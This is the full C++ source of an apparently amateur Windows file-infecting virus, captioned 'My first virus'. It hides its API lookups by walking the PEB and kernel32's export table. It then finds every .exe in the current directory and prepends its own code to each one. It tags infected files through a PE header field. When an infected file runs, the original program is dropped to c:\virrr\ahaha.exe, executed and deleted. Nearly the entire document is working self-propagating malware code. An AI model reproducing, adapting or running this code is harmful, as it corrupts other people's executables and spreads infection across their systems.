#include <Windows.h>
#include <stdio.h>
#include <conio.h>

#pragma comment(linker,"/MERGE:.rdata=.text")
#pragma comment(linker,"/FILEALIGN:512")
#pragma comment(linker,"/SECTION:.text,EWR /IGNORE:4078")
#pragma comment(linker,"/ENTRY:main")

#define NTSIGNATURE(a) ((LPVOID)(*((DWORD *)(a + 0x3c)) + a))
#define GETSIZEOFHEADERS(a) (*((DWORD*)(a + 0x54)))
#define ALIGN_DOWN(x, align) (x & ~(align - 1))
#define ALIGN_UP(x, align) ((x & (align - 1))?ALIGN_DOWN(x,align)+align:x)
#define OPT_SZ(p) (*((WORD*)(p + 0x14)))
#define NumOfSec(p) (*(WORD*)(p + 0x6))
#define pSectionTable(p) ((BYTE*)(p + 0x18 + OPT_SZ(p)))
#define pLastSection(p) (pSectionTable(p) + (NumOfSec(p) - 1) * 0x28)

wchar_t* CharToWchar(char*);
char* WcharToChar(wchar_t*);
bool FindFiles(int,HANDLE);
bool Infection(int, wchar_t*, HANDLE);
DWORD FindFuncs(char *);
int StrCmp(char*, char*);
void GetAPIs();
int WcsCat(wchar_t *, wchar_t *);

HANDLE (__stdcall *create_file)(LPWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE); 
BOOL (__stdcall *close_handle)(HANDLE);
LPVOID (__stdcall *map_view_of_file)( HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
HANDLE (__stdcall *create_file_mapping)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCTSTR lpName);
DWORD (__stdcall *set_file_pointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
BOOL (__stdcall *unmap_view_of_file)(LPCVOID lpBaseAddress);
BOOL (__stdcall *read_file)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
BOOL (__stdcall *write_file)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
DWORD (__stdcall *get_current_directory)(DWORD nBufferLength, LPTSTR lpBuffer);
HANDLE (__stdcall *find_first_file)(LPCTSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData);
BOOL (__stdcall *find_next_file)(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData);
BOOL (__stdcall *find_close)(HANDLE hFindFile);
int (__stdcall *mb_to_wc)(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
int (__stdcall *wc_to_mb)(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar);
int (__stdcall *message_box)(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType);
void (__stdcall *exit_process)(UINT);
int (__stdcall *get_module_file_name)(HANDLE hModule, LPWSTR fileName, DWORD size);



unsigned char bufPat[80241024], bufVir[60024];

int main(int argc, char *argv[])
{
	
	WIN32_FIND_DATA FindFileData;
	//Patient
	GetAPIs();
	wchar_t b[MAX_PATH];
	long w;
	HANDLE hfPat, hMap;
	BYTE* hMapAddress;
	DWORD atrFile, atrMap, atrAddr;

	get_module_file_name(NULL, b, MAX_PATH);
	printf("Name of file: %s\n", WcharToChar(b));
		atrFile = 0x80000000;
		atrMap = 0x02;
		atrAddr = 0x04;
	hfPat = create_file(b, atrFile, 0x00000001, NULL, 3, 0x00000080, 0); //FILE_SHARE_READ 0x00000001 OPEN_EXISTING 3  FILE_ATTRIBUTE_NORMAL 0x00000080
	if((DWORD)hfPat == 0xffffffff) {printf("Open patient file error!"); getch();close_handle(hfPat); return 0; }
	w = set_file_pointer(hfPat, 0,0, 2); //FILE_END 2
	hMap = create_file_mapping(hfPat, NULL, atrMap, 0, w, NULL); //PAGE_READWRITE 0x04
	if(hMap==NULL) {printf("error - hMap"); getch();close_handle(hfPat); return 0; }
	hMapAddress = (BYTE*) map_view_of_file(hMap, atrAddr, 0, 0, w);
	if(!hMapAddress) {printf("error - hMapAddress");getch();return 0;}
	
	BYTE* hPE = (BYTE*)NTSIGNATURE(hMapAddress);

	DWORD vir_sz = 0;
	if(*((DWORD*)(hPE + 0x4C)) == 0x4567) {
												FindFiles(2, hfPat);
												printf("2 generation\n");
												MessageBox(0,CharToWchar("virus"),CharToWchar("My first virus"),0);
												DWORD r = 0;
												char chStr2[38] = "c:\\virrr\\ahaha.exe";

												set_file_pointer(hfPat, -sizeof(vir_sz), 0, 2);
												if(!read_file(hfPat, &vir_sz, sizeof(vir_sz), &r, NULL)) printf("error read vir_sz");
												
												set_file_pointer(hfPat, vir_sz, 0, 0);
												HANDLE hfPat2 = create_file(CharToWchar(chStr2), 0xC0000000, 0x00000001, NULL, 2, 0x00000080, 0);
												if((DWORD)hfPat2 == 0xffffffff) {/*printf("Open vir file error!");*/ close_handle(hfPat2); return 0; }
												DWORD w1;
												unsigned char buf[1024];
												while(1)
												{
													read_file(hfPat,buf, 1024, &w1, NULL);
													write_file(hfPat2, buf, w1, &w1, NULL);
													if(w1 < 1024) break;
												};											
												close_handle(hfPat2);
												STARTUPINFO si;
												PROCESS_INFORMATION pi;
												GetStartupInfo(&si);
												if(!CreateProcess(CharToWchar(chStr2),NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi))return 0;
												HANDLE proc = pi.hProcess;
												WaitForSingleObject(proc, INFINITE);
												DeleteFile(CharToWchar(chStr2));
	}
	else
	{
		printf("1 generation\n");
		FindFiles(1,hfPat);
	}

	unmap_view_of_file(hMapAddress);
	close_handle(hMap);
	close_handle(hfPat);

	return 1;	
}

wchar_t* CharToWchar(char *temp)
{
	int len = 0;
	while(temp[len])
		len++;
	wchar_t *wStr = new wchar_t[len + 1];
	mb_to_wc(0, NULL, temp, -1, wStr, len);
	wStr[len] = 0;
	return wStr;
}

char* WcharToChar(wchar_t *temp)
{
	int len = 0;
	while(temp[len])
		len++;
	char *Str = new char[len + 1];
	wc_to_mb(1251, NULL, temp, -1, Str, len, NULL, NULL);
	Str[len] = '\0';
	//delete temp;
	return Str;
}

bool Infection(int gen, wchar_t *name, HANDLE hSource)
{
	wchar_t b[MAX_PATH];
	long w;
	HANDLE hfPat, hMap;
	BYTE* hMapAddress;
	DWORD atrFile, atrMap, atrAddr;
		atrFile = 0x80000000;
		atrMap = 0x02;
		atrAddr = 0x04;
	
	hfPat = create_file(name, atrFile, 0x00000001, NULL, 3, 0x00000080, 0); //FILE_SHARE_READ 0x00000001 OPEN_EXISTING 3  FILE_ATTRIBUTE_NORMAL 0x00000080
	if((DWORD)hfPat == 0xffffffff) {printf("I:Open patient file error!"); getch();close_handle(hfPat); return 0; }
	w = set_file_pointer(hfPat, 0,0, 2); //FILE_END 2
	hMap = create_file_mapping(hfPat, NULL, atrMap, 0, w, NULL); //PAGE_READWRITE 0x04
	if(hMap==NULL) {printf("I:error - hMap"); getch();close_handle(hfPat); return 0; }
	hMapAddress = (BYTE*) map_view_of_file(hMap, atrAddr, 0, 0, w);
	if(!hMapAddress) {printf("I:error - hMapAddress");getch();return 0;}
	
	BYTE* hPE = (BYTE*)NTSIGNATURE(hMapAddress);
	if(*((DWORD*)(hPE + 0x4C)) == 0x4567) {printf("Alredy infected"); return false;}
	if(!wcscmp(name,CharToWchar("Vir_var2.exe"))) 
	{
		printf("This is virus!\n");
		unmap_view_of_file(hMapAddress);
		close_handle(hMap);
		close_handle(hfPat);
		return true;
	}
	close_handle(hfPat);

	DWORD vir_sz = 0;
	DWORD i =0;
	hfPat = create_file(name, 0xC0000000, 0x00000001, NULL, 3, 0x00000080, 0); //FILE_SHARE_READ 0x00000001 OPEN_EXISTING 3  FILE_ATTRIBUTE_NORMAL 0x00000080
	if((DWORD)hfPat == 0xffffffff) {printf("I:Open patient file error!"); getch();close_handle(hfPat); return 0; }
	// Infection
	if(gen == 2) {
												DWORD r;
												set_file_pointer(hSource, -sizeof(vir_sz), 0, 2);
												if(!read_file(hSource, &vir_sz, sizeof(vir_sz), &r, NULL)) printf("I:error read vir_sz");
												
												set_file_pointer(hSource, 0, 0, 0);
												DWORD w1;
												unsigned char buf[1024];
												read_file(hSource,bufVir, vir_sz, &w1, NULL);
												set_file_pointer(hfPat, 0, 0, 0);
												i=0;
												while(1)
												{
													read_file(hfPat,&bufPat[i], 1024, &w1, NULL);
													i+=w1;
													if(w1 < 1024) break;
												};

												set_file_pointer(hfPat, 0, 0, 0);
												write_file(hfPat, bufVir, vir_sz, &w1, NULL);
												write_file(hfPat, bufPat, i, &i, NULL);
												write_file(hfPat, &vir_sz, sizeof(vir_sz), &w1, NULL);

	}
	else
	{
		//Virus

		vir_sz = set_file_pointer(hSource, 0, 0, 2); //FILE_END 2
	// vnedrenie
	
		set_file_pointer(hfPat, 0, 0, 0); //FILE_BEGIN 0
		set_file_pointer(hSource, 0, 0, 0);

		DWORD wr;
		unsigned char buf[1024];
		i=0;
		while(1)
		{
			read_file(hfPat,&bufPat[i], 1024, &wr, NULL);
			i+=wr;
			if(wr < 1024) break;
		};

		set_file_pointer(hfPat, 0, 0, 0);

		while(1)
		{
			read_file(hSource,buf, 1024, &wr, NULL);
			write_file(hfPat, buf, wr, &wr, NULL);
			if(wr < 1024) break;
		};
		write_file(hfPat, bufPat, i, &i, NULL);
		wr = 0;
		write_file(hfPat, &vir_sz, sizeof(vir_sz), &wr, NULL);
	}
		unmap_view_of_file(hMapAddress);
		close_handle(hMap);
		close_handle(hfPat);

		hfPat = create_file(name, 0xC0000000, 0x00000001, NULL, 3, 0x00000080, 0); //FILE_SHARE_READ 0x00000001 OPEN_EXISTING 3  FILE_ATTRIBUTE_NORMAL 0x00000080
		if((DWORD)hfPat == 0xffffffff) {/*printf("Open patient file error!");*/ close_handle(hfPat); return 0; }
		hMap = create_file_mapping(hfPat, NULL, 0x04, 0, w, NULL); //PAGE_READWRITE 0x04
		if(hMap==NULL) {/*printf("error - hMap");*/ close_handle(hfPat); return 0; }
		hMapAddress = (BYTE*) map_view_of_file(hMap, 0x02, 0, 0, w);
		if(!hMapAddress) {/*printf("error - hMapAddress")*/;return 0;}
		hPE = (BYTE*)NTSIGNATURE(hMapAddress);
		*((DWORD*)(hPE + 0x4C)) = 0x4567;
		unmap_view_of_file(hMapAddress);
		close_handle(hMap);
		close_handle(hfPat);
		printf("File %s succes infected", WcharToChar(name));
}

bool FindFiles(int gen, HANDLE hSource)
{
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = NULL;//INVALID_HANDLE_VALUE;
    wchar_t DirSpec[MAX_PATH];  // directory specification
    DWORD dwError;
	DWORD BufSize = MAX_PATH;
    //path[strlen(path)-10] = '\0';

	
	get_current_directory(BufSize, DirSpec);
  //  printf ("\nTarget directory is %s\n", WcharToChar(DirSpec));
    //strncpy (DirSpec, path, strlen(path)+1);
    WcsCat(DirSpec, CharToWchar("\\*.exe"));

    hFind = find_first_file(DirSpec, &FindFileData);

	
    if (hFind == INVALID_HANDLE_VALUE) 
    {
       printf ("Invalid file handle. Error is %u\n", GetLastError());
       return false;
    } 
    else 
    {	
		Infection(gen, FindFileData.cFileName, hSource);
		printf ("First file name is %s\nFile size = %x\n", WcharToChar(FindFileData.cFileName), FindFileData.nFileSizeLow);
       while (find_next_file(hFind, &FindFileData) != 0) 
       {
		   printf ("Next file name is %s\nFile size = %x\n", WcharToChar(FindFileData.cFileName), FindFileData.nFileSizeLow);
		   Infection(gen, FindFileData.cFileName, hSource);
     
       }
    
   //    dwError = GetLastError();
       find_close(hFind);
  /*     if (dwError != ERROR_NO_MORE_FILES) 
       {
          printf ("FindNextFile error. Error is %u\n", dwError);
          return false;
       }*/
    }
    return true;
}

DWORD FindFuncs(char *f_name)
{
	DWORD kernel;
		_asm
	{
		xor ebx, ebx               // clear ebx
		mov ebx, fs:[ 0x30 ]       // get a pointer to the PEB
		mov ebx, [ ebx + 0x0C ]    // get PEB->Ldr
	    mov ebx, [ ebx + 0x14 ]    // get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
		mov ebx, [ ebx ]           // get the next entry (2nd entry)
		mov ebx, [ ebx ]           // get the next entry (3rd entry)
		mov ebx, [ ebx + 0x10 ]    // get the 3rd entries base address (kernel32.dll)
		mov kernel, ebx
	}

	BYTE* p = (BYTE*)NTSIGNATURE(kernel);// + kernel);//*((DWORD*)(kernel + 0x3C)) + kernel;
	//printf("address = %d\nkernel = %d",LoadLibrary(CharToWchar("kernel32")), kernel);
	
	//if(*((DWORD*)p) == IMAGE_NT_SIGNATURE) printf("\nOK %s", f_name);
	
	DWORD* pDD = (DWORD*)(p + 0x78);// pointer to Data Directory
	DWORD pExport = pDD[0] + kernel;
	DWORD xExport = pDD[1];//size
	
	//DWORD nameRVA = *(DWORD*)(pExport + 0xC) + kernel;
	//DWORD ordinalBASE = *(DWORD*)(pExport + 0x10);
	//DWORD addressTableEntries = *(DWORD*)(pExport + 0x14);
	DWORD numberOfNamePointers = *(DWORD*)(pExport + 0x18);
	DWORD* exportAddressTableRVA = (DWORD*)(*(DWORD*)(pExport + 0x1C) + kernel);
	DWORD* namePointerRVA = (DWORD*)(*(DWORD*)(pExport + 0x20) + kernel);
	WORD* ordinalTableRVA = (WORD*)(*(DWORD*)(pExport + 0x24) + kernel);

	char* name;
	//char f_name[] = "MultiByteToWideChar";
	DWORD f_index, f_address, ordinal;
	//BYTE* pForward;
	BYTE ind = 0;
	
	//printf("name             ordinal/hint VirtualAddress Forward\n"\
	//		"------------------------------------------------\n");

	for(int i = 0; i < numberOfNamePointers; i++)
	{
		name = (char*)(namePointerRVA[i] + kernel);
		if(!StrCmp(name, f_name)) ind = 1;
  		f_index = ordinalTableRVA[i];
		f_address = (DWORD)((long)exportAddressTableRVA[f_index] + kernel);
		if(f_address == kernel) continue;
		//ordinal = f_index + ordinalBASE;

		/*if((f_address > (DWORD)pExport) && (f_address < (DWORD)(pExport + xExport)))
			pForward = (BYTE*)f_address;
		else pForward = 0;

		if(ind){
			printf("% 20s [%03d/%03d] %08Xh %s\n",
			name, ordinal, i, f_address, (pForward)?(char*)pForward:"");
		printf("----------------------------------------------------");*/
		if(ind) {/*printf("addr = %x",f_address);*/return (f_address);}
	}
	return 0;
}

void GetAPIs()
{
	create_file = (HANDLE (__stdcall *)(LPWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))FindFuncs("CreateFileW");
	map_view_of_file = (LPVOID (__stdcall *)( HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap))FindFuncs("MapViewOfFile");
	create_file_mapping = (HANDLE (__stdcall *)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCTSTR lpName))FindFuncs("CreateFileMappingW");
	close_handle = (BOOL (__stdcall*)(HANDLE))FindFuncs("CloseHandle");
	set_file_pointer = (DWORD (__stdcall *)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod))FindFuncs("SetFilePointer");
	unmap_view_of_file = (BOOL (__stdcall *)(LPCVOID lpBaseAddress))FindFuncs("UnmapViewOfFile");
	read_file = (BOOL (__stdcall *)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped))FindFuncs("ReadFile");
	write_file = (BOOL (__stdcall *)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped))FindFuncs("WriteFile");
	mb_to_wc = (int (__stdcall *)(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar))FindFuncs("MultiByteToWideChar");
	wc_to_mb = (int (__stdcall *)(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar))FindFuncs("WideCharToMultiByte");
	get_current_directory = (DWORD (__stdcall *)(DWORD nBufferLength, LPTSTR lpBuffer))FindFuncs("GetCurrentDirectoryW");
	find_first_file = (HANDLE (__stdcall *)(LPCTSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData))FindFuncs("FindFirstFileW");
	find_next_file = (BOOL (__stdcall *)(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData))FindFuncs("FindNextFileW");
	find_close = (BOOL (__stdcall *)(HANDLE hFindFile))FindFuncs("FindClose");
	message_box = (int (__stdcall *)(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType))FindFuncs("MESSAGEBOX");
	exit_process = (void (__stdcall *)(UINT))FindFuncs("ExitProcess");
	get_module_file_name = (int (__stdcall *)(HANDLE hModule, LPWSTR fileName, DWORD size))FindFuncs("GetModuleFileNameW");
}

int StrCmp(char *str1, char *str2)
{
	int i = 0;
	while((str1[i] == str2[i]) && (str1[i] != '\0')) i++;
	if(str1[i] == '\0') return 0;
	else return 1;
}

int WcsCat(wchar_t *dest, wchar_t *source)
{
	int i= 0, j = 0;
	while(dest[i]) i++;
	while(source[j]) {dest[i] = source[j]; j++; i++;}
	dest[i] = 0;
	return 1;
}